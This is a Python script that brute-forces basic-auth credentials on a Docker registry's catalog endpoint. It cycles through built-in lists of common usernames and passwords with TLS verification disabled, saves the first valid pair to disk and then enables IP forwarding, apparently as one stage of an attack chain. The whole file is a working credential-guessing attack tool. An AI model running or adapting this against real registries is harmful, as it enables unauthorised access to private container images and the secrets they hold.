#!/usr/bin/env python3
"""Enumerate registry credentials and persist the first valid pair."""

from __future__ import annotations

import base64
import json
import os
import ssl
import subprocess
import sys
import urllib.error
import urllib.request
from pathlib import Path


COMMON_USERS = """
admin administrator user test guest info root sysadmin support service manager
operator developer webmaster administrator1 admin1 user1 test1 guest1 root1 demo
demo1 student teacher office ftp oracle mysql postgres nginx apache db sql
ftpuser docker git github gitlab bitbucket jira confluence sftpuser dbadmin
shop zabbix nagios cisco juniper sshd hp dell dbuser ibm lenovo microsoft
windows linux ubuntu debian centos redhat fedora suse arch kali aws azure gcp
cloud signal icloud devops ssh ci cd build runner agent worker node server
client api apiuser bot bot1 robot service1 service2 proxy proxy1 proxy2 vpn
vpn1 vpn2 testuser
""".split()

COMMON_PASSWORDS = """
123456 123456789 qwerty password 111111 12345678 abc123 1234567 password1
12345 1234567890 123123 000000 iloveyou 1234 1q2w3e4r5t qwertyuiop 123
monkey dragon 123456a 654321 123321 666666 1qaz2wsx myspace1 121212
123qwe a123456 123abc 1q2w3e4r qwe123 7777777 qwerty123 target123
tinkle 987654321 qwerty1 222222 zxcvbnm 1g2w3e4r gwerty zag12wsx
gwerty123 555555 112233 asdfghjkl 1q2w3e 123123123 qazwsx computer
12345a ashley 159753 michael football 1234qwer iloveyou1 aaaaaa 789456123
daniel 777777 123654 11111 asdfgh 999999 11111111 passer2009 888888 love
abcd1234 shadow football1 love123 superman jessica monkey1 12qwaszx a12345
baseball 123456789a killer asdf samsung master azerty charlie asd123
fqrg7cs493 88888888 jordan testpassword
""".split()


def unique(values: list[str]) -> list[str]:
    seen: set[str] = set()
    ordered: list[str] = []
    for value in values:
        value = value.strip()
        if value and value not in seen:
            seen.add(value)
            ordered.append(value)
    return ordered


def catalog_request(url: str, user: str, password: str, timeout: float) -> tuple[int, str]:
    token = base64.b64encode(f"{user}:{password}".encode("utf-8")).decode("ascii")
    request = urllib.request.Request(url, headers={"Authorization": f"Basic {token}"})
    context = ssl._create_unverified_context()
    try:
        with urllib.request.urlopen(request, timeout=timeout, context=context) as response:
            return int(response.status), response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read().decode("utf-8", errors="replace")
    except Exception as exc:
        print(f"[WARN] registry probe failed for user '{user}': {exc}", file=sys.stderr)
        return 0, ""


def candidate_pairs(registry_user: str, registry_pass: str) -> list[tuple[str, str]]:
    preferred: list[tuple[str, str]] = []
    if registry_user and registry_pass:
        preferred.append((registry_user, registry_pass))
    preferred.append(("testuser", "testpassword"))

    users = unique([registry_user] + COMMON_USERS)
    passwords = unique([registry_pass] + COMMON_PASSWORDS)
    return unique_pairs(preferred + [(user, password) for user in users for password in passwords])


def unique_pairs(values: list[tuple[str, str]]) -> list[tuple[str, str]]:
    seen: set[tuple[str, str]] = set()
    ordered: list[tuple[str, str]] = []
    for pair in values:
        if not pair[0] or not pair[1] or pair in seen:
            continue
        seen.add(pair)
        ordered.append(pair)
    return ordered


def main(argv: list[str]) -> int:
    data_path = os.environ.get("DATA_PATH", "/tmp/KCData")
    outdir = Path(argv[1] if len(argv) > 1 else f"{data_path}/KC2")
    registry_user = argv[2] if len(argv) > 2 else os.environ.get("REGISTRY_USER", "")
    registry_pass = argv[3] if len(argv) > 3 else os.environ.get("REGISTRY_PASS", "")
    registry_name = argv[4] if len(argv) > 4 else os.environ.get("REGISTRY_NAME", "registry")
    registry_port = argv[5] if len(argv) > 5 else os.environ.get("REGISTRY_PORT", "5000")
    max_attempts = int(os.environ.get("PASS_ENUM_MAX_ATTEMPTS", "500"))
    timeout = float(os.environ.get("PASS_ENUM_TIMEOUT", "5"))

    catalog_url = f"https://{registry_name}:{registry_port}/v2/_catalog"
    outdir.mkdir(parents=True, exist_ok=True)

    for attempt, (user, password) in enumerate(candidate_pairs(registry_user, registry_pass), start=1):
        if attempt > max_attempts:
            break
        code, body = catalog_request(catalog_url, user, password, timeout)
        if code == 200:
            (outdir / "user").write_text(user + "\n", encoding="utf-8")
            (outdir / "pass").write_text(password + "\n", encoding="utf-8")
            print(f"Credentials: {user} - {password}")
            try:
                print(json.dumps(json.loads(body), indent=2, sort_keys=True))
            except json.JSONDecodeError:
                print(body)
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False)
            print("SCRIPT FINISHED")
            return 0

    print(f"No valid registry credentials found for {registry_name}:{registry_port}", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
